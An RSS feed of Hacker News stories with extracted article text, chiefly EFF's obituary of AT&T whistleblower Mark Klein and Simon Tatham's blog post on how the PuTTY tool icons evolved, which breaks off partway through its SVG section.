<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 13 Mar 2025 01:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Mark Klein, AT&T whistleblower who revealed NSA mass spying, has died (573 pts)]]></title>
            <link>https://www.eff.org/deeplinks/2025/03/memoriam-mark-klein-att-whistleblower-about-nsa-mass-spying</link>
            <guid>43347662</guid>
            <pubDate>Wed, 12 Mar 2025 21:05:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eff.org/deeplinks/2025/03/memoriam-mark-klein-att-whistleblower-about-nsa-mass-spying">https://www.eff.org/deeplinks/2025/03/memoriam-mark-klein-att-whistleblower-about-nsa-mass-spying</a>, See on <a href="https://news.ycombinator.com/item?id=43347662">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article role="article">
  
  
  <div><p>EFF is deeply saddened to learn of the passing of Mark Klein, a bona fide hero who risked civil liability and criminal prosecution to help expose a massive spying program that violated the rights of millions of Americans.</p>
<p>Mark didn’t set out to change the world. For 22 years, he was a telecommunications technician for AT&amp;T, most of that in San Francisco. But he always had a strong sense of right and wrong and a commitment to privacy.</p>
<p><span>Mark not only saw how it works, he had the documents to prove it.</span></p>
<p>When the New York Times reported in late 2005 that the NSA was engaging in spying inside the U.S., Mark realized that he had witnessed how it was happening. He also realized that the President was not telling Americans the truth about the program. And, though newly retired, he knew that he had to do something. He showed up at EFF’s front door in early 2006 with a simple question: “Do you folks care about privacy?”&nbsp;</p>
<p>We did. And what Mark told us changed everything. Through his work, Mark had learned that the National Security Agency (NSA) had installed a secret, secure room at AT&amp;T’s central office in San Francisco, called <a href="https://en.wikipedia.org/wiki/Room_641A">Room 641A</a>. Mark was assigned to connect circuits carrying Internet data to optical “splitters” that sat just outside of the secret NSA room but were hardwired into it. Those splitters—as well as similar ones in cities around the U.S.—<a href="https://www.eff.org/files/2014/07/24/backbone-3c-color.jpg">made a copy</a> of all data going through those circuits and delivered it into the secret room.</p>
<div><p><img src="https://www.eff.org/files/2025/03/12/secretroom1_f.jpg" width="500" height="373" alt="Photo of NSA-controlled &quot;secret room&quot; " title="Photo of NSA-controlled &quot;secret room&quot; "></p></div>
<p>Mark not only saw how it works, he had the documents to prove it. He brought us over a hundred pages of authenticated AT&amp;T schematic diagrams and tables. Mark also shared this information with major media outlets, numerous Congressional staffers, and at least two senators personally. One, Senator <a href="https://www.youtube.com/watch?v=Pylu8ycLfC4">Chris Dodd</a>, took the floor of the Senate to acknowledge Mark as the great American hero he was.</p>
<p>We used Mark’s evidence to bring two lawsuits against the <a href="https://www.eff.org/nsa-spying">NSA spying</a> that he uncovered. The first was <a href="https://www.eff.org/cases/hepting">Hepting v. AT&amp;T</a> and the second was <a href="https://www.eff.org/cases/jewel">Jewel v. NSA</a>. Mark also came with us to <a href="https://www.nytimes.com/2007/11/07/us/07nsa.html">Washington D.C</a>. to push for an end to the spying and demand accountability for it happening in secret for so many years.&nbsp; He wrote an account of his experience called <a href="https://www.goodreads.com/book/show/6625940-wiring-up-the-big-brother-machine-and-fighting-it"><em>Wiring Up the Big Brother Machine . . . And Fighting It</em>.</a></p>
<div><p><img src="https://www.eff.org/files/2025/03/12/mark-klein-washington.jpg" width="1284" height="633" alt="cartoon featuring Mark Klein climbing Capitol Hill" title="cartoon featuring Mark Klein climbing Capitol Hill"></p><p>Archival EFF graphic promoting Mark Klein's DC tour</p></div>
<p>Mark stood up and told the truth at great personal risk to himself and his family. AT&amp;T threatened to sue him, although it wisely decided not to do so. While we were able to use his evidence to make some change, both EFF and Mark were ultimately let down by Congress and the Courts, which have refused to take the steps necessary to end the mass spying even after Edward Snowden provided even more evidence of it in 2013.&nbsp;</p>
<p>But Mark certainly inspired all of us at EFF, and he helped inspire and inform hundreds of thousands of ordinary Americans to demand an end to illegal mass surveillance. While we have not yet seen the success in ending the spying that we all have hoped for, his bravery helped to usher numerous reforms so far.</p>
<p>And the fight is not over. The law, <a href="https://www.eff.org/702-spying">called Section 702</a>, that now authorizes the continued surveillance that Mark first revealed, expires in early 2026. EFF and others will continue to push for continued reforms and, ultimately, for the illegal spying to end entirely.</p>
<p>Mark’s legacy lives on in our continuing fights to reform surveillance and honor the Fourth Amendment’s promise of protecting personal privacy. We are forever grateful to him for having the courage to stand up and will do our best to honor that legacy by continuing the fight.&nbsp;</p>

</div>

          </article>
    </div><div>
          <h2>Join EFF Lists</h2>
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Intel appoints Lip-Bu Tan as its CEO (189 pts)]]></title>
            <link>https://www.reuters.com/technology/us-chipmaker-intel-appoints-lip-bu-tan-its-ceo-2025-03-12/</link>
            <guid>43347369</guid>
            <pubDate>Wed, 12 Mar 2025 20:31:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.reuters.com/technology/us-chipmaker-intel-appoints-lip-bu-tan-its-ceo-2025-03-12/">https://www.reuters.com/technology/us-chipmaker-intel-appoints-lip-bu-tan-its-ceo-2025-03-12/</a>, See on <a href="https://news.ycombinator.com/item?id=43347369">Hacker News</a></p>
Couldn't get https://www.reuters.com/technology/us-chipmaker-intel-appoints-lip-bu-tan-its-ceo-2025-03-12/: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Time Portal – Get dropped into history, guess where you landed (178 pts)]]></title>
            <link>https://www.eggnog.ai/entertimeportal</link>
            <guid>43347306</guid>
            <pubDate>Wed, 12 Mar 2025 20:23:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eggnog.ai/entertimeportal">https://www.eggnog.ai/entertimeportal</a>, See on <a href="https://news.ycombinator.com/item?id=43347306">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Iconography of the PuTTY tools (174 pts)]]></title>
            <link>https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/</link>
            <guid>43346816</guid>
            <pubDate>Wed, 12 Mar 2025 19:29:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/">https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/</a>, See on <a href="https://news.ycombinator.com/item?id=43346816">Hacker News</a></p>
<div id="readability-page-1" class="page">
    
    <p>[Simon Tatham, 2025-03-12]</p>
    <ul>
      <li>
        <a href="#intro">Introduction</a>
      </li>
      <li>
        <a href="#drawing">Hand-drawn era</a>
        <ul>
          <li>
            <a href="#original">PuTTY itself</a>
          </li>
          <li>
            <a href="#pscp">PSCP (and PSFTP): file transfer</a>
          </li>
          <li>
            <a href="#pageant">Pageant: SSH agent</a>
          </li>
          <li>
            <a href="#puttygen">PuTTYgen: key generator</a>
          </li>
          <li>
            <a href="#config">Configuration dialog box</a>
          </li>
        </ul>
      </li>
      <li>
        <a href="#script">Scripted era</a>
        <ul>
          <li>
            <a href="#pterm">pterm</a>
          </li>
          <li>
            <a href="#installer">Installer</a>
          </li>
        </ul>
      </li>
      <li>
        <a href="#svg">SVG revamp</a>
      </li>
      <li>
        <a href="#eof">That’s all, folks!</a>
      </li>
    </ul>
    <h2 id="intro">Introduction</h2>
    <p>In March 2025 I received an email asking about PuTTY’s “logo” –
      the icon used by the Windows executable. The sender wanted to
      know where it had come from, and how it had evolved over
      time.</p>
    <p>Sometimes I receive an email asking a question, and by the time
      I’ve finished answering it, I realise it’s worth turning into a
      blog post. This time I knew it was going to be one of those
      before I even started typing, because there’s a graphic design
      angle to the question <em>and</em> a technical angle. So I had a
      lot to say.</p>
    <p>PuTTY’s icon designs date from the late 1990s and early 2000s.
      They’ve never had a major <em>stylistic</em> redesign, but over
      the years, the icons have had to be re-rendered under various
      constraints, which made for a technical challenge as well.</p>
    <h2 id="drawing">Hand-drawn era</h2>
    <p>When I first started drawing PuTTY icons, I didn’t know I was
      going to need lots of them at different sizes. So I didn’t start
      off with any automation – I just drew each one by hand in the
      MSVC icon editor.</p>
    <h3 id="original">PuTTY itself</h3>
    <p>Expanded to a visible size, here’s the earliest version of the
      original PuTTY icon that I still have still in my source
      control. That means it was current in early 1999; my source
      control doesn’t go all the way back to the very project start in
      the summer of 1996, but if it did, I expect this
      was <em>probably</em> the same icon I originally drew. I’d have
      drawn one quite early, because Windows GUI programs look pretty
      unhelpful without an icon.</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/putty-original.png" alt="[putty-original.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/putty-original-bw.png" alt="[putty-original-bw.png]">
        </p>
      </div>
      <figcaption>The original PuTTY icon, in colour and in
        monochrome</figcaption>
    </figure>
    <p>It’s 32&nbsp;×&nbsp;32 pixels, and uses a limited palette of primary
      colours and shades of grey. That’s because I started the project
      in the mid-1990s, when non-truecolour displays were very common.
      There was a fixed 16-colour palette recommended for use in
      icons, consisting of the obvious primary and secondary colours
      and dim versions of them, plus a couple of spare shades of grey.
      That way all the icons in the entire GUI could reuse the same 16
      palette entries and not run the display out of colours. So this
      icon is drawn using that palette.</p>
    <p>Providing a plain black-and-white version was another standard
      recommendation at the time. But I can’t remember why – I
      certainly never actually <em>saw</em> a computer running Win95
      or later with a B&amp;W display! My best guess is that the
      recommendation was intended for use with the “Win32s” extension
      that would let 32-bit programs at least <em>try</em> to run on
      Windows 3.1 (on suitable underlying hardware). Probably Windows
      3 still supported black and white displays.</p>
    <p>I don’t think I thought about the design very much. I just
      dashed it off because I needed <em>some</em> kind of an icon.
      The two computers are drawn in a style that was common in the
      ’90s: a system box sitting under a CRT monitor, with a floppy
      disk drive visible at the right-hand end. They’re connected with
      a lightning bolt to suggest electrical communication between
      them. I didn’t <em>believe</em> I was being very original: I had
      the vague idea that several icons of this kind already existed
      (although I’ve never been able to find any specific example of
      what I was thinking of), so in my head, it fit with the general
      iconography of the day, and seemed as if it would be immediately
      understandable.</p>
    <p>I can’t remember why the lightning bolt was <em>yellow</em>.
      With hindsight that seems the strangest thing about it; cyan
      would have been a more obvious choice for electricity. Possibly
      it was just to contrast more with the blue screens of the
      computers.</p>
    <p>Speaking of which … I can’t remember why the screens were blue,
      either. I <em>think</em> I just intended it as a neutral-ish
      sort of colour which wasn’t black, so that it was clear that the
      screens were turned on. I’m pretty sure the blue <em>wasn’t</em>
      an allusion to the Windows Blue Screen of Death – that wouldn’t
      make sense, because in a typical use of PuTTY, only <em>one</em>
      end of the connection is running Windows, and neither end has
      crashed!</p>
    <p>Looking back, I suppose I might also have considered making the
      two computers look different from each other, on the theory that
      the client machine might be sitting on someone’s desk, and the
      server might be in a rack in a datacentre? But I was a student
      when I started writing PuTTY, and <em>my</em> Linux server you
      could remotely log into was on my desk and not in a rack. So I
      think that just never even occurred to me.</p>
    <h3 id="pscp">PSCP (and PSFTP): file transfer</h3>
    <p>In 1999, a contributor sent an SCP implementation, and PSCP was
      born. I decided to draw it an icon of its own.</p>
    <p>It wasn’t especially important for PSCP to have an icon at all.
      You don’t run it <em>from</em> a GUI (it’s useless without
      command-line arguments), so it doesn’t need an icon for you to
      find it in Explorer or identify it in the Start Menu. And it
      doesn’t put up GUI windows, so it wouldn’t need an icon to
      identify those in the taskbar either. But I drew an icon anyway.
      I can’t remember why. Maybe it was just for completeness, or I
      felt like doing a bit of drawing, or something.</p>
    <p>I made the PSCP icon by modifying the existing PuTTY icon,
      replacing one of the two computers with a piece of paper with
      variable-length lines on it, suggesting a written document:</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pscp-original.png" alt="[pscp-original.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pscp-original-bw.png" alt="[pscp-original-bw.png]">
        </p>
      </div>
      <figcaption>The original PSCP icon, in colour and in
        monochrome</figcaption>
    </figure>
    <p>I kept the lightning bolt connecting the remaining computer to
      that document, the theory being that you use PSCP to remotely
      access documents. (In some fairly vague sense.)</p>
    <p>Later on, we gained a second file transfer tool, PSFTP, and I
      reused the same icon for that, on the basis that they’re both
      file transfer tools and the icon doesn’t really say anything
      specific to one of them. PSFTP is still a command-line
      application, but unlike PSCP, it’s possible to run
      it <em>from</em> the GUI (by clicking on it in Explorer or the
      Start Menu), because it has an interactive prompt, so if you
      don’t run it with any command-line arguments, you can tell it at
      the prompt where to connect to. So PSFTP put the same icon to a
      more practical use than PSCP did.</p>
    <p>(On the other hand, giving two tools the same icon means you
      have to check carefully which one you’re dragging around in
      Explorer! Perhaps it would have been better to make the PSCP and
      PSFTP icons different in some way. But I couldn’t easily think
      of a visual depiction of the ways the two tools differ.)</p>
    <h3 id="pageant">Pageant: SSH agent</h3>
    <p>Pageant, our SSH agent, was the next tool in the suite that
      needed an icon.</p>
    <p>My original idea for an icon depicting an SSH agent was to draw
      the face of a <em>secret</em> agent – in the stereotypical
      outfit from the sillier end of spy fiction, with a wide-brimmed
      hat and a turned-up collar.</p>
    <p>But I’m terrible at drawing faces. After a few failed attempts,
      I realised that Pageant would never get released <em>at all</em>
      if I waited until I’d drawn the icon I wanted. So instead I took
      the secret agent’s hat – the only part which I <em>had</em>
      drawn to my satisfaction – and simply sat it on top of a larger
      version of the computer from the original PuTTY icon, at a
      rakish angle.</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pageant-original.png" alt="[pageant-original.png]">
        </p>
      </div>
      <figcaption>The original Pageant icon</figcaption>
    </figure>
    <p>I’d intended that as a placeholder, planning to come back and
      have another try later at drawing my original idea of a human
      secret agent. But then I realised the icon I’d already drawn was
      simply <em>better!</em> It fits visually with the rest of the
      suite by reusing the same computer design; it’s more appropriate
      because the ‘agent’ in question <em>is</em> computerised rather
      than human. And most importantly of all, a computer wearing a
      hat turned out to be cute. So I kept it.</p>
    <p>On the technical side: Pageant’s original icon <em>didn’t</em>
      come with a black and white version. I don’t remember why not;
      perhaps, with Windows 3 a few more years in the past, it just
      didn’t seem important enough any more. But on the other hand,
      Pageant introduced a new requirement: I had to draw
      a <em>small</em> version of the icon. Up to this point I’d just
      drawn everything at the (then) standard icon size of 32&nbsp;×&nbsp;32;
      but Pageant puts an icon in the System Tray on the taskbar, so
      it needed a smaller 16&nbsp;×&nbsp;16 icon to fit there. If you just let
      Windows scale down the 32&nbsp;×&nbsp;32 version, it didn’t do such a good
      job of it.</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pageant-original-small.png" alt="[pageant-original-small.png]">
        </p>
      </div>
      <figcaption>Half-size version of the original Pageant icon</figcaption>
    </figure>
    <p>Drawing a small version of the same computer logo was a
      challenge, especially while still using that 16-colour fixed
      palette. You can see that I’ve done some tricks with the darker
      palette entries, ‘hand-antialiasing’ the hatband, and replacing
      the internal black outline at the bottom of the computer monitor
      with a dark grey one to try to make it less prominent – as if
      the original 1-pixel black outline had been scaled down to half
      a pixel.</p>
    <p>(But the <em>external</em> outline is still solid black, so
      that it separates the entire icon clearly from whatever
      background colour it’s shown on. The taskbar is grey, and so is
      most of the icon, so that’s still important!)</p>
    <h3 id="puttygen">PuTTYgen: key generator</h3>
    <p>After that came PuTTYgen. I drew another “computer + lightning
      bolt + object” icon, this time with the other object being a key
      – a weak visual pun, since PuTTYgen generates and works with
      cryptographic keys.</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttygen-original.png" alt="[puttygen-original.png]">
        </p>
      </div>
      <figcaption>The original PuTTYgen icon</figcaption>
    </figure>
    <p>The lightning bolt indicating network communication was
      particularly inappropriate in this tool. It was already fairly
      tenuous in PSCP, but PuTTYgen doesn’t do any network
      communication <em>at all</em>, so the lightning bolt was
      completely inaccurate. I really put it in there for visual
      consistency with the rest of the icons: it’s there to signal
      “this is a tool from the same suite as PuTTY”.</p>
    <p>(I’m still not <em>very</em> happy with the drawing of the
      key.)</p>
    <p>This icon is the other way up from the PSCP one: here, I’ve
      kept the computer in the lower left corner from the main PuTTY
      icon, and replaced the top right one with a different weird
      object, whereas in PSCP, I kept the top right computer and
      replaced the <em>other</em> one with an object. I don’t remember
      having any particular reason for that – perhaps I just didn’t
      even bother to check which way round I’d drawn the previous
      icon! But I’m not too unhappy with it, because it makes the two
      icons more different from each other, so easier to tell
      apart.</p>
    <h3 id="config">Configuration dialog box</h3>
    <p>The next icon we needed wasn’t for a separate tool at all: it
      was for PuTTY’s configuration dialog box.</p>
    <p>The taskbar entry for the config box had the boring “default”
      icon, just representing a generic window frame, that Windows
      uses for any window that doesn’t supply a better one. I’d
      decided that looked ugly.</p>
    <p>Rather than just reuse the main PuTTY icon unmodified, I drew
      an icon to specifically represent configuration or modification,
      by overlaying a large spanner on top:</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttycfg-original.png" alt="[puttycfg-original.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttycfg-original-bw.png" alt="[puttycfg-original-bw.png]">
        </p>
      </div>
      <figcaption>The PuTTY configuration dialog icon, in colour and in
        monochrome</figcaption>
    </figure>
    <p>For this icon I went back to including a monochrome version. I
      can’t remember why. Perhaps it was just that I was modifying an
      existing icon which <em>did</em> have a monochrome version!</p>
    <h2 id="script">Scripted era</h2>
    <p>Nothing else happened in this area until 2007.</p>
    <p>That was about when people started to complain that the 32&nbsp;×&nbsp;32
      pixel icons had started to look nasty. Displays had become
      bigger, and Windows was defaulting to displaying 48&nbsp;×&nbsp;48 icons
      instead of 32&nbsp;×&nbsp;32. So if your application only had a 32&nbsp;×&nbsp;32 icon,
      Windows would stretch it.</p>
    <p>It wouldn’t have looked great if a 32&nbsp;×&nbsp;32 icon had been
      magnified by an exact factor of 2 to 64&nbsp;×&nbsp;64, copying each input
      pixel the same number of times. But 48 isn’t even a multiple of
      32, so instead Windows had to stretch my
      icons <em>unevenly</em>, which looked even worse.</p>
    <p>Rather than hand-draw another full set of icons, I decided to
      get more ambitious. So I wrote a piece of code that drew all the
      components of each icon image in a programmatic way, so that I
      could run the script to auto-generate a full set of icons for
      every tool. That eliminated the inconsistency about which icons
      had tiny versions, and which ones had black and white versions:
      now <em>all</em> the icons had <em>all</em> versions.</p>
    <p>The hard part of that was the tiny 16&nbsp;×&nbsp;16 icons. I’d only
      drawn one of those so far, for Pageant. Now I had to try to
      capture the artistic judgment I’d used for the
      “hand-antialiasing” in that icon, and try to make a piece of
      software do the same thing for <em>all</em> the graphical
      components of the icon suite.</p>
    <p>I remember that being pretty hard work, but in the end I
      managed to make something I was happy with. After
      that, <em>every</em> icon had 48&nbsp;×&nbsp;48, 32&nbsp;×&nbsp;32 and 16&nbsp;×&nbsp;16
      icons.</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/putty-script-48.png" alt="[putty-script-48.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/putty-script-32.png" alt="[putty-script-32.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/putty-script-16.png" alt="[putty-script-16.png]">
        </p>
      </div>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pscp-script-48.png" alt="[pscp-script-48.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pscp-script-32.png" alt="[pscp-script-32.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pscp-script-16.png" alt="[pscp-script-16.png]">
        </p>
      </div>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pageant-script-48.png" alt="[pageant-script-48.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pageant-script-32.png" alt="[pageant-script-32.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pageant-script-16.png" alt="[pageant-script-16.png]">
        </p>
      </div>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttygen-script-48.png" alt="[puttygen-script-48.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttygen-script-32.png" alt="[puttygen-script-32.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttygen-script-16.png" alt="[puttygen-script-16.png]">
        </p>
      </div>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttycfg-script-48.png" alt="[puttycfg-script-48.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttycfg-script-32.png" alt="[puttycfg-script-32.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttycfg-script-16.png" alt="[puttycfg-script-16.png]">
        </p>
      </div>
      <figcaption>A full set of icons generated by the script</figcaption>
    </figure>
    <p>I stopped short of trying to make the program
      recreate <em>every</em> decision I’d made in the original
      drawing. I made quite a few of those decisions in a hurry
      without much thought, after all. So I just got the script to a
      point I was happy <em>enough</em> with. And I took the
      opportunity to improve on a few things: for
      example, <em>all</em> versions of the Pageant hatband are now
      antialiased, not just the tiny version.</p>
    <p>But there are other ways that the scripted icons
      don’t <em>exactly</em> match the original hand-drawn versions.
      The radio buttons below should let you flip back and forth
      between two example icons in the original and script-generated
      versions:</p>
    <figure>
      <div>
          <div>
            <p><span><label for="icons-orig">Original</label><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pair-originals.png" alt="[pair-originals.png]"></span>
              <span><label for="icons-script">Scripted</label><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pair-script.png" alt="[pair-script.png]"></span>
            </p>
          </div>
          <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/double-icon-spacer-32.png" alt="">
        </p></div>
      <figcaption>Use the radio buttons to switch between the original
        PuTTY and Pageant icons and the 32&nbsp;×&nbsp;32 output from the
        script</figcaption>
    </figure>
    <p>The actual PuTTY icon is a pretty close match – only a small
      number of pixels changed. But the Pageant icon is quite
      different: apart from the deliberate change of the antialiased
      hatband, the computer in the icon isn’t even the
      same <em>size!</em> I can’t remember if that was a pure accident
      (maybe I didn’t flip back and forth between the two versions of
      that icon while I was writing the script), or a deliberate style
      change.</p>
    <p>(Of course, if I’d <em>wanted</em> to change the size of the
      computer, it would have been easier to do it using the script
      than redrawing by hand. So it would have made sense for it to be
      a deliberate change, now that the opportunity was available. But
      I don’t remember that it <em>was</em> deliberate.)</p>
    <p>As I said earlier, I made sure the script could generate a full
      set of black-and-white icons too, just in case. In 2007 I think
      it was even less likely that anyone would still be running
      Windows (or anything else) on a B&amp;W display, but one of the
      nice things about having this stuff done by a script is that you
      can get it to do a lot of hard work for you just in case. So now
      I have a full set of black and white icons too, even at the new
      size of 48 pixels:</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/putty-script-48bw.png" alt="[putty-script-48bw.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pscp-script-48bw.png" alt="[pscp-script-48bw.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pageant-script-48bw.png" alt="[pageant-script-48bw.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttygen-script-48bw.png" alt="[puttygen-script-48bw.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttycfg-script-48bw.png" alt="[puttycfg-script-48bw.png]">
        </p>
      </div>
      <figcaption>All five icons, in black and white, at 48 pixels</figcaption>
    </figure>
    <h3 id="pterm">pterm</h3>
    <p>In 2002 I had ported a lot of the PuTTY code to Linux. I wrote
      a Linux version of the full GUI PuTTY application, and also
      reused part of the code as an X11 terminal
      emulator <code>pterm</code> which you could use in place of
      existing ones like <code>xterm</code>.</p>
    <p>Linux GUI applications can also have icons if they want to: an
      X11 program can set a property on its window, containing a
      bitmap to be used as its icon. Window managers vary
      in <em>what</em> they use this for – they might minimise the
      whole window to an icon in Windows 3.1 style, or display the
      icon in a taskbar entry in the style of more modern Windows, or
      display the icon somewhere in the application’s window frame, or
      anything else they can think of.</p>
    <p>I hadn’t done anything about this in 2002, partly because as
      far as I knew the toolkit library I was using (GTK 1) didn’t
      support setting an icon on the window, and also because it would
      have been a pain to provide the same icons in multiple bitmap
      file formats.</p>
    <p>But now that I was generating the icons from a script, it was
      suddenly much easier to make the script output multiple file
      formats. Also I found out that GTK 1 <em>did</em> let you set an
      icon property after all. (In any case, I already knew GTK 2
      could do that, and was planning an upgrade to that.) So, for
      both reasons, it was now practical to provide icons for the X11
      versions of the PuTTY tools.</p>
    <p>So I had to draw an icon for <code>pterm</code>, which didn’t
      already have one!</p>
    <p>This time, I really did run out of imagination.
      Since <code>pterm</code> doesn’t do any network communication, I
      simply drew an icon consisting of <em>just one</em> copy of the
      same computer logo seen in all the other icons, expanding it to
      the full size of the icon image. (A little bigger than it was for
      Pageant, since this time it didn’t have to fit under a hat.)</p>
    <p><code>pterm</code> also has a configuration dialog box, so I
      made a separate icon for that, reusing the same spanner overlay
      from PuTTY proper.</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/pterm-script-48.png" alt="[pterm-script-48.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/ptermcfg-script-48.png" alt="[ptermcfg-script-48.png]">
        </p>
      </div>
      <figcaption>The icon for <code>pterm</code>, and its
        configuration dialog</figcaption>
    </figure>
    <p><em>Much</em> later, in 2021, it became possible to write a
      version of <code>pterm</code> that would run on Windows, and act
      as an alternative GUI container for an ordinary
      Windows <code>cmd.exe</code> or Powershell session. This icon
      became the one for Windows pterm as well, once that
      happened.</p>
    <h3 id="installer">Installer</h3>
    <p>The flexible icon-drawing script also let me support true
      colour icons as an extra output mode, so I wasn’t limited to the
      old 16-colour palette any more.</p>
    <p>That came in handy when I needed an icon for the
      PuTTY <em>installer</em>. I thought it would be nice to draw a
      cardboard box as part of that icon, with the flaps open at the
      top and a lightning bolt coming out of it pointing at a
      computer, suggesting “PuTTY is zapping out of this box on to
      your machine”. Cardboard boxes are brown, and brown wasn’t in
      the 16-colour icon palette – but now we weren’t limited to that
      palette any more, so I could draw a true-colour icon
      using <em>actual</em> brown!</p>
    <p>But I still wanted to support the 16-colour icons, because I
      never like to throw away backwards compatibility if I can avoid
      it. And I noticed that you could make <em>several</em>
      acceptable shades of brown by taking two different colours in
      the old Windows 16-colour icon palette, and mixing them 50:50.
      All my mixes involved the dark red (<span><code>#800000</code></span>); I got three
      different browns, or brown-enough colours, by mixing it with
      black (<span><code>#000000</code></span>), dark yellow
      (<span><code>#808000</code></span>), and full yellow
      (<span><code>#ffff00</code></span>).</p>
    <p>So I made the cardboard box out of those three 50-50 mixes,
      using them all to show that different parts of the box were at
      different angles to the light. That way, in the true-colour icon
      I could use a single colour that was the mean of the two old
      colours, and in the 16-colour version I halftoned it by
      alternating pixels of the <em>actual</em> two old colours.</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttyins-script-48tc.png" alt="[puttyins-script-48tc.png]">
        </p>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/puttyins-script-48.png" alt="[puttyins-script-48.png]">
        </p>
      </div>
      <figcaption>The PuTTY installer icon, in true-colour and
        halftoned versions</figcaption>
    </figure>
    <h2 id="svg">SVG revamp</h2>
    <p>My icon-drawing script works well at the ordinary 32&nbsp;×&nbsp;32 and
      48&nbsp;×&nbsp;48 sizes, and scales <em>down</em> to 16&nbsp;×&nbsp;16 reasonably
      well, but it doesn’t work so well when you start
      scaling <em>up</em>.</p>
    <p>So, if anyone needs <em>really big</em> versions of the icons,
      generating them by just running the same script with a bigger
      image size won’t produce very nice output. In one of my failed
      attempts to port PuTTY to the Mac, I found that MacOS wanted a
      128&nbsp;×&nbsp;128 icon to use in the dock, and the output of my script
      at that size was definitely not great.</p>
    <p>I’ve more or less given up on that Mac port now, but I thought
      that a fully scalable version of all the icons might still be a
      useful thing to have around. For one thing, it allows using them
      in contexts other than GUI icons. (Gratuitous merch, anyone?
      T-shirts? Laptop decals? 🙂)</p>
    <p>So, partly “just in case” but also for fun, I’ve been working
      on a second icon-drawing script. It mimics the same “thought
      processes” of the original script, but it outputs SVG files
      instead of bitmaps – keeping the artwork still as close as
      possible to the original style.</p>
    <p>As of now, these are my best efforts at the SVG versions:</p>
    <figure>
      <div>
        <p><img src="https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/putty-icons/putty.svg" alt="[putty.svg]" width="192" height="192">
        </p>
